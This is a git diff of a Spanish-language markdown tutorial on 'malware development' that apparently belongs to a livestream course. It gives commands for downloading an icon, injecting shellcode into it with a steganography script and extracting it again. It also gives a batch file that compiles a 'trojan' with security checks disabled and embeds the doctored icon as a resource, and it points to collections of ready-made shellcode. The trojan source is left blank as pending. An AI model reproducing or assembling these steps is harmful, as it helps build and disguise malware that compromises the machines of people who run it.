@@ -1,8 +1,8 @@
-# DESARROLLO DE MALWARE BY @N3XXU5_666
+## DESARROLLO DE MALWARE BY @N3XXU5_666
 
 - Descarga de imagen .ico
 ```bash
-curl 
+curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o pornhub.ico
 ```
 
 - Payload or Shellcode:
@@ -145,18 +145,18 @@ if name == "main":
 ```
 - Inyecta el shellcode en la imagen
 ```bash
-python3 -hide pornhb.ico shellcode.bin pornhblsb.ico
+python3 -hide pornhub.ico shellcode.bin pornhublsb.ico
 ```
 - Extrae el shellcode de la imagen
 ```bash
-python3 -extract pornhblsb.ico # Crea archivo message.bin
+python3 -extract pornhublsb.ico # Crea archivo message.bin
 ```
-# REFERENCIAS :
-[SHELLCODES](http://shell-storm.org/shellcode/index.html) | Shellcodes pre-creados
-[DONUT](https://github.com/TheWover/donut) | Convierte codigo cpp compilado a shellcode
+#### REFERENCIAS :
+| [SHELLCODES](http://shell-storm.org/shellcode/index.html) | Shellcodes pre-creados |
+| [DONUT](https://github.com/TheWover/donut) | Convierte codigo cpp compilado a shellcode |
 
-# SCRIPTS EN BATCH PARA COMPILAR TROJANO
-##Proceso desde SO Windows
+## SCRIPTS EN BATCH PARA COMPILAR TROJANO
+Proceso desde SO Windows
 - Compilador (VS-code) FILE: compile.bat
 ```
 @ECHO OFF
@@ -165,7 +165,7 @@ rc resources.rc
 cvtres /nologo /MACHINE:x64 /OUT:resources.o resources.res
 cl.exe /nologo /0x /MI /W0 /GS- /DNDBUG /Tp trojan.cpp /Link /OUT:resources.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
 ```
-# REFERENCIAS :
+#### REFERENCIAS :
 [COMPILER-FLAGS](https://learn.microsoft.com/en-us/cpp/build/reference/compiler-options-listed-alphabetically?view=msvc-170) | Banderas de compilacion. Se pueden modificar en base al compilador a usar.
 
 - resources.rc
@@ -180,7 +180,7 @@ MY_ICON RCDATA pornhublsb.ico
 ```
 - trojan1.cpp
 ```
-
+Pendiente para la siguiente sesion de sabado 10/12/2022
 ```
 - Proceso de compilacion desde el x64 Native Tools Command Prompt for Visual Studio
 Los native tools ya vienen instalados al instalar [FLARE-VM](https://github.com/mandiant/flare-vm) | Software de Analisis de malware
@@ -188,7 +188,9 @@ Los native tools ya vienen instalados al instalar [FLARE-VM](https://github.com/
 compile.bat 
 ```
 
-
+#### Follow me on [Socials Network](https://wlo.link/@Ivam3)
+#### Follow at N3XU5 on [Telegram](https://t.me/N3XU5_666) & [YouTube](https://www.youtube.com/@N3XU5_666)
+#### JOIN to the next [LIVESTREAM](https://t.me/Ivam3byCinderella?livestream)
 
 
 
